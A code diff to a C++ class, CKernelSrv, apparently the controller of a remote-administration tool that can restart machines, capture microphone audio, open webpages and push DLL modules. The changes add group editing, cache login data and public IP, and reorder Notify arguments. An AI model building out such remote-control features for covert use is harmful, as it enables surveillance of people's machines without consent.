@@ -17,6 +17,7 @@ CEventHandler(pClient,KNEL)
 	m_LastGetTime            = 0;
 	m_lpBuffer = new BYTE[MAX_CHUNK_SIZE];
 	m_bLogin = FALSE;
+	m_szPublicIP[0] = 0;
 }
 
 
@@ -58,8 +59,15 @@ void CKernelSrv::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
 		OnLogin((LoginInfo*)lpData);
 		break;
 	case KNEL_EDITCOMMENT_OK:
-		Notify(WM_CLIENT_EDITCOMMENT, (WPARAM)this,(LPARAM)lpData);
+		Notify(WM_KERNEL_EDITCOMMENT, (WPARAM)this, (LPARAM)lpData);
+		lstrcpyn(m_LoginInfo.Comment, (TCHAR*)lpData, 255);
 		break;
+
+	case KNEL_EDIT_GROUP_OK:
+		Notify(WM_KERNEL_EDITGROUP, (WPARAM)this, (LPARAM)lpData);
+		lstrcpyn(m_LoginInfo.szGroup, (TCHAR*)lpData, 255);
+		break;
+
 	case KNEL_GETMODULE_INFO:
 		OnGetModuleInfo((TCHAR*)lpData);
 		break;
@@ -89,6 +97,11 @@ void CKernelSrv::EditComment(TCHAR*Comment)
 	Send(KNEL_EDITCOMMENT,Comment, sizeof(TCHAR) * (lstrlen(Comment) + 1));
 }
 
+void CKernelSrv::EditGroup(TCHAR * szGroup)
+{
+	Send(KNEL_EDIT_GROUP, szGroup, sizeof(TCHAR) * (lstrlen(szGroup) + 1));
+}
+
 void CKernelSrv::Restart()
 {
 	Send(KNEL_RESTART, 0, 0);
@@ -111,7 +124,7 @@ void CKernelSrv::UtilsOpenWebpage(TCHAR * szUrl)
 
 void CKernelSrv::OnError(TCHAR * Error)
 {
-	Notify(WM_KERNEL_ERROR, (WPARAM)Error,(LPARAM)this);
+	Notify(WM_KERNEL_ERROR, (WPARAM)this, (LPARAM)Error);
 }
 
 
@@ -298,6 +311,7 @@ void CKernelSrv::BeginMicrophone()
 void CKernelSrv::OnLogin(LoginInfo *pLi)
 {
 	m_bLogin = TRUE;
+	memcpy(&m_LoginInfo, pLi, sizeof(LoginInfo));
 	Notify(WM_KERNEL_LOGIN, (WPARAM)this, (LPARAM)pLi);
 }
 
@@ -445,7 +459,7 @@ void CKernelSrv::OnGetModuleChunk(char * ChunkInfo){
 			ArgList[3] = (LPVOID)(dwOffset + SuccessBytes);
 
 			//更新进度....
-			Notify(WM_KERNEL_UPDATE_UPLODA_STATU, 4, (LPARAM)ArgList);
+			Notify(WM_KERNEL_UPDATE_UPLODA_STATU, (WPARAM)this, (LPARAM)ArgList);
 		}
 	} while (FALSE);
 }
@@ -467,7 +481,7 @@ void CKernelSrv::OnGetModuleInfo(const TCHAR*ModuleName){
 	//Get Modules Path
 	if (m_szModulePath[0] == 0)
 	{
-		Notify(WM_KERNEL_GET_MODULE_PATH, (WPARAM)m_szModulePath);
+		Notify(WM_KERNEL_GET_MODULE_PATH, (WPARAM)this, (LPARAM)m_szModulePath);
 	}
 
 	wsprintf(FileName,TEXT( "%s\\%s.dll"), m_szModulePath, ModuleName);
@@ -524,9 +538,11 @@ void CKernelSrv::OnGetModuleInfo(const TCHAR*ModuleName){
 
 CString CKernelSrv::GetPublicIP()
 {
-	char szIp[64];
-	GetPeerAddress(szIp);
-	return CString(szIp);
+	if (!m_szPublicIP[0])
+	{
+		GetPeerAddress(m_szPublicIP);
+	}
+	return CString(m_szPublicIP);
 }
 
 
